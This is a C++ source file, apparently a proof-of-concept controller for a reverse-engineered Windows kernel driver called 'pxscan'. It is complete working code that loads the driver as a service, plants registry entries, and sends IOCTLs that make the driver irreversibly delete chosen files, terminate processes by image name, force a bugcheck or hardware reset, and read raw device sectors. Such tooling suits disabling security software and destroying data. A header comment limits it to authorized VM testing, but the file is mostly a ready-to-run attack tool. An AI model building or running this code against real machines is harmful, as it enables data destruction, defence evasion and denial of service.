// pxctl.cpp
// PoC userspace controller for the "pxscan" kernel driver IOCTL interface.
//
// Reverse-engineered interface (x64, objfre_wlh):
//   Device       \\.\pxscan  (SDDL: SYSTEM + Builtin\Administrators only)
//   Registry     HKLM\SYSTEM\CurrentControlSet\Services\pxscan\Files
//                  "c_rem" = REG_SZ "<count>"   (how many entries)
//                  "0","1".."N-1" = REG_SZ "<abs path>"
//                HKLM\SYSTEM\CurrentControlSet\Services\pxscan\param
//                  nonzero REG_DWORD enables auto-start of worker threads at load
//
//   IOCTL 0x22E000  raw 1KB read from \Device\xxx at given offset (3 slots cached)
//   IOCTL 0x22E004  returns 8 byte value (capability query)
//   IOCTL 0x22E00C  returns 16416(0x4020) size hint  (name/query)
//   IOCTL 0x22E034  hardware warm reset (port 0x64, 0xFE) then KeBugCheck(0xE5)
//   IOCTL 0x22E044  spawn worker threads: registry cleanup + file/process cleanup
//   IOCTL 0x22E048  KeBugCheck(0xF7)  (immediate BSOD)
//   IOCTL 0x22E400  zero 4 bytes, returns 4 bytes
//
// File/process cleanup (started by 0x22E044, NOT immediate - see TIMING):
//   For each entry under Files\:
//     - sub_11960: file marked-for-delete + ZwDeleteFile  (always, every round)
//     - round 1 only: enumerate handles/processes; if process image name contains
//       the substring after the drive colon of our path, ZwTerminateProcess.
//   Timing: first round fires ~10s after IOCTL; 5 rounds of 40s each.
//
// NOTE: "delete" and "kill" share one mechanism (0x22E044). The driver ALWAYS
// attempts file deletion; process termination additionally only matches when the
// path contains a ':' drive specifier (use full "C:\.." style paths).
//
// Build (x64):  cl /O2 /EHsc pxctl.cpp
//
// WARNING: For authorized testing in an isolated VM only. bsod/reboot will crash
// the machine; file deletion is kernel-assisted and irreversible.

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winioctl.h>
#include <wchar.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")

#define PX_DEVICE       L"\\\\.\\pxscan"
#define PX_SVC_NAME     L"pxscan"
#define PX_KEY_PATH     L"SYSTEM\\CurrentControlSet\\Services\\pxscan"
#define PX_FILES_KEY    PX_KEY_PATH L"\\Files"
#define PX_PARAM_VALUE  L"param"

#define IOCTL_PX_READ    0x22E000UL
#define IOCTL_PX_Q8      0x22E004UL
#define IOCTL_PX_Q16     0x22E00CUL
#define IOCTL_PX_REBOOT  0x22E034UL
#define IOCTL_PX_SCAN    0x22E044UL
#define IOCTL_PX_BSOD    0x22E048UL
#define IOCTL_PX_ZERO    0x22E400UL

static void die(const wchar_t *op)
{
    wprintf(L"[-] %s failed, error %lu (0x%lX)\n", op, GetLastError(), GetLastError());
}

static void banner(void)
{
    wprintf(L"pxctl - pxscan driver control PoC\n"
            L"  For authorized lab testing only.\n\n");
}

// ---------------- registry helpers ----------------

static BOOL write_files_entry(int index, const wchar_t *path)
{
    HKEY hk = NULL;
    LONG r;
    WCHAR indexName[16];
    const wchar_t *cRem = L"1";

    r = RegCreateKeyExW(HKEY_LOCAL_MACHINE, PX_FILES_KEY, 0, NULL,
                        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hk, NULL);
    if (r != ERROR_SUCCESS) { die(L"RegCreateKeyEx(Files)"); return FALSE; }

    r = RegSetValueExW(hk, L"c_rem", 0, REG_SZ,
                       (const BYTE *)cRem, (DWORD)((wcslen(cRem) + 1) * sizeof(wchar_t)));
    if (r != ERROR_SUCCESS) { die(L"RegSetValueEx(c_rem)"); goto out; }

    _snwprintf(indexName, 16, L"%d", index);
    r = RegSetValueExW(hk, indexName, 0, REG_SZ,
                       (const BYTE *)path, (DWORD)((wcslen(path) + 1) * sizeof(wchar_t)));
    if (r != ERROR_SUCCESS) { die(L"RegSetValueEx(target)"); goto out; }

    wprintf(L"[+] Files\\%s = \"%ls\", c_rem = %ls\n", indexName, path, cRem);
out:
    RegCloseKey(hk);
    return r == ERROR_SUCCESS;
}

static BOOL set_param_nonzero(void)
{
    HKEY hk = NULL;
    LONG r;
    DWORD v = 1;

    r = RegCreateKeyExW(HKEY_LOCAL_MACHINE, PX_KEY_PATH, 0, NULL,
                        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hk, NULL);
    if (r != ERROR_SUCCESS) { die(L"RegCreateKeyEx(param)"); return FALSE; }
    r = RegSetValueExW(hk, PX_PARAM_VALUE, 0, REG_DWORD,
                       (const BYTE *)&v, sizeof(v));
    RegCloseKey(hk);
    if (r != ERROR_SUCCESS) { die(L"RegSetValueEx(param)"); return FALSE; }
    return TRUE;
}

// ---------------- SCM helpers ----------------

static BOOL delete_files_key(void)
{
    LONG r = RegDeleteTreeW(HKEY_LOCAL_MACHINE, PX_FILES_KEY);
    if (r == ERROR_SUCCESS || r == ERROR_FILE_NOT_FOUND || r == ERROR_PATH_NOT_FOUND) {
        wprintf(L"[+] Files registry key cleared\n");
        return TRUE;
    }
    die(L"RegDeleteTree(Files)");
    return FALSE;
}

static BOOL px_load(const wchar_t *sysPath)
{
    SC_HANDLE mgr = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    SC_HANDLE svc = NULL;
    BOOL ok = FALSE;

    if (!mgr) { die(L"OpenSCManager"); return FALSE; }

    svc = OpenServiceW(mgr, PX_SVC_NAME, SERVICE_ALL_ACCESS);
    if (svc) {
        wprintf(L"[.] Service \"pxscan\" already exists, deleting first\n");
        DeleteService(svc);
        CloseServiceHandle(svc);
        svc = NULL;
    }

    svc = CreateServiceW(mgr, PX_SVC_NAME, PX_SVC_NAME,
                         SERVICE_ALL_ACCESS,
                         SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                         SERVICE_ERROR_NORMAL,
                         sysPath, NULL, NULL, NULL, NULL, NULL);
    if (!svc) { die(L"CreateService"); goto out; }

    if (!StartServiceW(svc, 0, NULL)) {
        if (GetLastError() != ERROR_SERVICE_ALREADY_RUNNING) {
            die(L"StartService");
            goto out;
        }
        wprintf(L"[+] service already running\n");
    } else {
        wprintf(L"[+] service \"pxscan\" started\n");
    }

    wprintf(L"[+] registry key: HKLM\\%s\n", PX_KEY_PATH);
    ok = TRUE;
out:
    if (svc) CloseServiceHandle(svc);
    CloseServiceHandle(mgr);
    return ok;
}

static BOOL px_unload(void)
{
    SC_HANDLE mgr = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    SC_HANDLE svc = NULL;
    SERVICE_STATUS ss;
    BOOL ok = FALSE;

    if (!mgr) { die(L"OpenSCManager"); return FALSE; }
    svc = OpenServiceW(mgr, PX_SVC_NAME, SERVICE_ALL_ACCESS);
    if (!svc) { die(L"OpenService"); goto out; }

    // NOTE: pxscan has no DriverUnload handler, so stopping the service does
    // not free the driver; only a reboot evicts it. We still stop+delete the SCM entry.
    if (ControlService(svc, SERVICE_CONTROL_STOP, &ss)) {
        wprintf(L"[+] service stopped (driver itself stays loaded until reboot)\n");
    } else if (GetLastError() != ERROR_SERVICE_NOT_ACTIVE) {
        wprintf(L"[!] ControlService failed, error %lu\n", GetLastError());
    }

    if (DeleteService(svc)) wprintf(L"[+] service entry deleted\n");
    else                     wprintf(L"[!] DeleteService failed, error %lu\n", GetLastError());

    ok = TRUE;
out:
    if (svc) CloseServiceHandle(svc);
    CloseServiceHandle(mgr);
    return ok;
}

// ---------------- IOCTL helpers ----------------

static HANDLE px_open(void)
{
    return CreateFileW(PX_DEVICE, GENERIC_READ | GENERIC_WRITE,
                       0, NULL, OPEN_EXISTING, 0, NULL);
}

static BOOL px_ioctl(HANDLE h, DWORD code, void *in, DWORD inLen,
                     void *out, DWORD outLen, DWORD *retLen)
{
    BOOL ok = DeviceIoControl(h, code, in, inLen, out, outLen, retLen, NULL);
    if (!ok) die(L"DeviceIoControl");
    return ok;
}

// ---------------- commands ----------------

static int cmd_bsod(void)
{
    HANDLE h = px_open();
    DWORD rl = 0;
    banner();
    wprintf(L"[.] sending IOCTL 0x%08X (KeBugCheck 0xF7)...\n", IOCTL_PX_BSOD);
    if (h == INVALID_HANDLE_VALUE) { die(L"CreateFile(\\\\\\.\\pxscan)"); return 1; }
    px_ioctl(h, IOCTL_PX_BSOD, NULL, 0, NULL, 0, &rl);
    CloseHandle(h);
    wprintf(L"[!] if you see this line the driver did not bugcheck\n");
    return 0;
}

static int cmd_reboot(void)
{
    HANDLE h = px_open();
    DWORD rl = 0;
    banner();
    wprintf(L"[.] sending IOCTL 0x%08X (warm reset + KeBugCheck 0xE5)...\n", IOCTL_PX_REBOOT);
    if (h == INVALID_HANDLE_VALUE) { die(L"CreateFile(\\\\\\.\\pxscan)"); return 1; }
    px_ioctl(h, IOCTL_PX_REBOOT, NULL, 0, NULL, 0, &rl);
    CloseHandle(h);
    wprintf(L"[!] if you see this line the driver did not reset\n");
    return 0;
}

static int cmd_scan_trigger(const wchar_t *path)
{
    HANDLE h;
    DWORD rl = 0;

    banner();
    if (!write_files_entry(0, path)) return 1;

    wprintf(L"[.] sending IOCTL 0x%08X (spawn worker threads)...\n", IOCTL_PX_SCAN);
    h = px_open();
    if (h == INVALID_HANDLE_VALUE) { die(L"CreateFile(\\\\\\.\\pxscan)"); return 1; }
    if (px_ioctl(h, IOCTL_PX_SCAN, NULL, 0, NULL, 0, &rl)) {
        wprintf(L"[+] IOCTL delivered. Worker threads will act within ~10s (first round)\n"
                L"    and repeat up to 5 rounds (40s apart).\n");
    }
    CloseHandle(h);
    return 0;
}

static int cmd_read(const wchar_t *device, ULONGLONG offset)
{
    // Input layout for IOCTL_PX_READ (>= 0x44C bytes):
    //   +0x000  LARGE_INTEGER StartingOffset
    //   +0x008  0x400 bytes   read destination buffer
    //   +0x408  ULONG slot index (0..2)
    //   +0x40C  WCHAR \Device\... name (wide, NUL-terminated)
    HANDLE h;
    DWORD rl = 0;
    BYTE *buf = (BYTE *)malloc(0x44C);
    int i;

    banner();
    if (!buf) return 1;
    memset(buf, 0, 0x44C);
    *(ULONGLONG *)(buf + 0) = offset;
    *(ULONG *)(buf + 0x408) = 0;   // slot 0
    wcscpy_s((wchar_t *)(buf + 0x40C), (0x44C - 0x40C) / 2, device);

    h = px_open();
    if (h == INVALID_HANDLE_VALUE) { die(L"CreateFile(\\\\\\.\\pxscan)"); free(buf); return 1; }
    if (px_ioctl(h, IOCTL_PX_READ, buf, 0x44C, buf, 0x44C, &rl)) {
        wprintf(L"[+] new offset 0x%llX, returned %lu bytes into +0x008:\n", offset, rl);
        for (i = 0; i < 64; i++) {
            if (i % 16 == 0) wprintf(L"%04X: ", i);
            wprintf(L"%02X ", buf[8 + i]);
            if (i % 16 == 15) wprintf(L"\n");
        }
    }
    CloseHandle(h);
    free(buf);
    return 0;
}

static int cmd_query(void)
{
    HANDLE h = px_open();
    DWORD rl = 0;
    ULONGLONG data = 0;
    banner();
    if (h == INVALID_HANDLE_VALUE) { die(L"CreateFile(\\\\\\.\\pxscan)"); return 1; }

    if (px_ioctl(h, IOCTL_PX_Q8, NULL, 0, &data, 8, &rl))
        wprintf(L"[+] IOCTL 0x%08X -> %lu bytes: 0x%016llX\n", IOCTL_PX_Q8, rl, data);

    rl = 0; data = 0;
    if (px_ioctl(h, IOCTL_PX_Q16, NULL, 0, &data, sizeof(data), &rl))
        wprintf(L"[+] IOCTL 0x%08X -> %lu bytes: 0x%016llX\n", IOCTL_PX_Q16, rl, data);

    rl = 0;
    if (px_ioctl(h, IOCTL_PX_ZERO, NULL, 0, &data, sizeof(data), &rl))
        wprintf(L"[+] IOCTL 0x%08X -> %lu bytes: 0x%016llX\n", IOCTL_PX_ZERO, rl, data);

    CloseHandle(h);
    return 0;
}

// ---------------- usage ----------------

static void usage(const wchar_t *exe)
{
    wprintf(
        L"usage:\n"
        L"  %s load   <path\\pxscan.sys>                  create + start kernel service\n"
        L"  %s unload                                     stop + delete SCM entry (driver persists till reboot)\n"
        L"  %s bsod                                       immediate KeBugCheck(0xF7) via IOCTL 0x22E048\n"
        L"  %s reboot                                     warm reset + bugcheck via IOCTL 0x22E034\n"
        L"  %s delete  <\\??\\C:\\abs\\file.exe>          delete file (IOCTL 0x22E044) [NT namespace filepath of the file]\n"
        L"  %s kill    <C:\\abs\\image.exe>               kill process (IOCTL 0x22E044) [Win32 filepath of the process]\n"
        L"  %s read    <\\Device\\xxx> <offset>           raw 1KB read (IOCTL 0x22E000)\n"
        L"  %s query                                      exercise 0x22E004/0x22E00C/0x22E400\n"
        L"\n"
        L"notes:\n"
        L"  * \"delete\" and \"kill\" use the same driver mechanism; deletion always happens (but it only works on NT namespace path),\n"
        L"    process termination only matches on round 1 when path contains a drive colon (it only works on Win32 path).\n"
        L"  * actions are NOT instantaneous: worker threads fire first round ~10s after IOCTL.\n"
        L"  * needs Administrator (device SDDL: SYSTEM + Builtin\\Administrators only).\n",
        exe, exe, exe, exe, exe, exe, exe, exe);
}

int wmain(int argc, wchar_t **argv)
{
    if (argc < 2) { usage(argv[0]); return 1; }

    if (!_wcsicmp(argv[1], L"load"))   return (argc >= 3) ? (px_load(argv[2]) ? 0 : 1) : (usage(argv[0]), 1);
    if (!_wcsicmp(argv[1], L"unload")) return px_unload() ? 0 : 1;
    if (!_wcsicmp(argv[1], L"bsod"))   return cmd_bsod();
    if (!_wcsicmp(argv[1], L"reboot")) return cmd_reboot();
    if (!_wcsicmp(argv[1], L"delete")) return (argc >= 3) ? cmd_scan_trigger(argv[2]) : (usage(argv[0]), 1);
    if (!_wcsicmp(argv[1], L"kill"))   return (argc >= 3) ? cmd_scan_trigger(argv[2]) : (usage(argv[0]), 1);
    if (!_wcsicmp(argv[1], L"read"))   return (argc >= 4) ? cmd_read(argv[2], _wcstoui64(argv[3], NULL, 0)) : (usage(argv[0]), 1);
    if (!_wcsicmp(argv[1], L"query"))  return cmd_query();
    if (!_wcsicmp(argv[1], L"clean"))  return delete_files_key() ? 0 : 1;

    usage(argv[0]);
    return 1;
}